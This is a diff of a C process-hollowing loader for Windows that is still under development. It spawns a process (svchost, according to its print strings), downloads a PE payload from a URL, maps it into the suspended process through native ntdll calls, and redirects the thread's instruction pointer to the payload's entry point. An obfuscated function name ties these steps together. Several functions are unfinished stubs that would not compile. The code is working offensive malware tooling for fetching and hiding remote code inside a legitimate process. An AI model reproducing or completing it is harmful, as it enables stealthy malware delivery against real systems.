@@ -7,12 +7,12 @@
 #include "ntdll_imit.h"
 #include "config.h"
 
-PROCESS_INFORMATION spawn(){
+PROCESS_INFORMATION spawn(char *processPath){
 STARTUPINFOA stInfo={0};
 stInfo.cb=sizeof(stInfo);
 PROCESS_INFORMATION pInfo;
 if(CreateProcessA(
-PROCESS,
+processPath,
 NULL,
 NULL,
 NULL,
@@ -29,7 +29,7 @@ printf("[-] CreateProcessA %lu\n",GetLastError());
 exit(1);
 }
 
-BYTE* fetchPE(){
+BYTE* fetchPE(char* url){
 
     // general initialization fn
     HINTERNET internet=InternetOpenA(
@@ -45,7 +45,7 @@ BYTE* fetchPE(){
     }
     HINTERNET hurl=InternetOpenUrlA(
         internet,
-        WEB_SERVER,
+        URL,
         NULL,
         0,
         INTERNET_FLAG_RELOAD,
@@ -156,10 +156,10 @@ void mapRoutineX(HANDLE proc,BYTE* remoteV,MappingMetadata mm,IMAGE_SECTION_HEAD
     DWORD oldProt=0;
     DWORD newProtection=0;
 
-    if(protections & IMAGE_SCN_MEM_EXECUTE){
+    if((protections & IMAGE_SCN_MEM_EXECUTE)==IMAGE_SCN_MEM_EXECUTE){
         newProtection=PAGE_EXECUTE_READ;
     }
-    else if((protections & IMAGE_SCN_MEM_READ) && (protections & IMAGE_SCN_MEM_WRITE)){
+    else if(((protections & IMAGE_SCN_MEM_READ)==IMAGE_SCN_MEM_READ) && (protections & IMAGE_SCN_MEM_WRITE)==IMAGE_SCN_MEM_WRITE){
         newProtection=PAGE_READWRITE;
     }
     else{
@@ -184,12 +184,6 @@ void mapRoutineX(HANDLE proc,BYTE* remoteV,MappingMetadata mm,IMAGE_SECTION_HEAD
 }
 
 
-// BUG IS WITHIN rellocate() SOMEWHERE
-
-
-
-// bug: blockSz shows 0 for some IMAGE_BASE_RELOCATION
-// ISSUE IN RELLOC
 void rellocate(HANDLE proc,void* remoteImageBase,void* heapBase,void* preferedBase,IMAGE_SECTION_HEADER *sec){
     printf("RELLOC STARTED\n");
     // reloction block in heap (first el in list)
@@ -248,24 +242,39 @@ void rellocate(HANDLE proc,void* remoteImageBase,void* heapBase,void* preferedBa
 }
 
 
-void resolveIAT(BYTE* imageBase,IMAGE_DATA_DIRECTORY* dataDirectoryList){
-    // 1) map libraries to remote process as view of section
-    // 2) resolve iat for libs
+
+// vergiliusproject.com 
+bool loadDLL(HANDLE proc){
+    // getmodulehandlea to determine if dll is loaded locally
+    
+    resolveIAT(dll_base);
+}   
 
 
-    IMAGE_DATA_DIRECTORY* importDD=(dataDirectoryList+IMAGE_DIRECTORY_ENTRY_IMPORT);
-    unsigned long rva=importDD->VirtualAddress;
-    unsigned long size=importDD->Size;
+bool isDllLoaded(char* dll,char** loaded_list,int loaded_count){
 
-    IMAGE_IMPORT_DESCRIPTOR* import=(IMAGE_IMPORT_DESCRIPTOR*)(imageBase+rva);
-
-    for(unsigned long i=0;i<size;i++){
-        char* dll_name=(char*)(imageBase+import->Name);
-        IMAGE_THUNK_DATA64* thunk=(IMAGE_THUNK_DATA64*)(imageBase+import->FirstThunk);
+    int offset=0;
+    for(int i=0;i<loaded_count;i++){
         
-        
-        
-        import++;
+        strncmp()
+    }
+
+}
+
+
+void* extractDllExportTable(){
+
+}
+
+// should work for both main PE and loaded DLLs
+void resolveIAT(HANDLE proc,BYTE* imageBase,IMAGE_DATA_DIRECTORY* dataDirectoryList){
+
+
+    if(isDllLoaded()){
+        void* table=extractDllExportTable();
+        // map
+    }else{
+        void* table=injectDLL();
     }
 
 
@@ -279,6 +288,25 @@ T_NtQueryInformationProcess NtQueryInformationProcess=(T_NtQueryInformationProce
 T_NtMapViewOfSection NtMapViewOfSection=(T_NtMapViewOfSection)GetProcAddress(ntdll,"NtMapViewOfSection");
 T_NtUnmapViewOfSection NtUnmapViewOfSection=(T_NtUnmapViewOfSection)GetProcAddress(ntdll,"NtUnmapViewOfSection");
 T_NtCreateSection NtCreateSection=(T_NtCreateSection)GetProcAddress(ntdll,"NtCreateSection");
+    
+PROCESS_BASIC_INFORMATION self_pinfo;
+unsigned long sz=sizeof(self_pinfo);
+    if(NtQueryInformationProcess(
+        GetCurrentProcess(),
+        ProcessBasicInformation,
+        &self_pinfo,
+        sz,
+        &sz
+    )!=0)
+        NtQueryInformationProcess(
+        GetCurrentProcess(),
+        ProcessBasicInformation,
+        &self_pinfo,
+        sz,
+        &sz
+    );
+
+    BYTE* selfPEB=self_pinfo.PebBaseAddress;
 
 
  PROCESS_BASIC_INFORMATION pinfo;
@@ -377,19 +405,25 @@ if(!WriteProcessMemory(
     exit(1);
 }
 
-// in windows versions ntdll initialization procedures differ version by version
-// so for guaranteed, it is better to fill IAT manually with functions.
 
-resolveIAT(remoteV,mm.dataDirectoryList);
+int remoteDllCount=1;
+
+char* remoteLoadedDlls="ntdll";
+
+resolveIAT(proc,remoteV,mm.dataDirectoryList);
 
 uintptr_t entryPont=(uintptr_t)(remoteV+mm.RVAAddressOfEntryPoint);
+
+printf("address of entry point is: %p\n",(void*)entryPont);
+printf("address of entry point is: %llu\n",entryPont);
+
 
 printf("ENTRY POINT: %llu\n",entryPont);
 CONTEXT thContext;
 if(!GetThreadContext(thread,&thContext))
     printf("[-] 288!\n");
     
-thContext.Rcx=(DWORD64)entryPont;
+thContext.Rip=(DWORD64)entryPont;
 if(!SetThreadContext(thread,&thContext))
     printf("[-] 293!\n");
 
@@ -404,12 +438,13 @@ return false;
 }
 
 bool __0x1FN3C3SS4RY__(){
-    PROCESS_INFORMATION pinfo=spawn();
-    printf("SVCHOST PID: %i\n",pinfo.dwProcessId);
-    HANDLE svchost=pinfo.hProcess;
-    HANDLE svchostMainThread=pinfo.hThread;
-    BYTE* pe=fetchPE(); // returns heap base 
-    bool cool=hallowAndStart(svchost,svchostMainThread,pe);
+    PROCESS_INFORMATION pinfo=spawn(PROCESS);
+    printf("CHECK PROCESS WITH DEBUGGER BEFORE UNMAP //// SVCHOST PID: %i\n",pinfo.dwProcessId);
+    getchar();
+    HANDLE hProc=pinfo.hProcess;
+    HANDLE hMainThread=pinfo.hThread;
+    BYTE* pe=fetchPE(URL); // returns heap base 
+    bool cool=hallowAndStart(hProc,hMainThread,pe);
     if(cool)
         return true;
     exit(1);
